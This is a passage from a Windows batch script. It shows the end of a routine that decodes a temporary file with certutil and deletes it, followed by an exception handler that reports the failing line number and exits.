    )
    certutil -f -decode "!filePath!.tmp" "!filePath!" >nul
    del /f "!filePath!.tmp" >nul
    %return%
)

:__exception (id)
%private%
(
    set "id=%1"
    for /F "tokens=1 delims=: usebackq" %%l in (`findstr /N "!id!" "%~f0"`) do (
        set /a "lineNumber=%%l"
    )
    %echo.error:code=UncaughtException% ^(!id! at line !lineNumber!^)
    %echo.error:code=UncaughtException% Press any key to terminate...
    pause >nul
    call :exit 1
)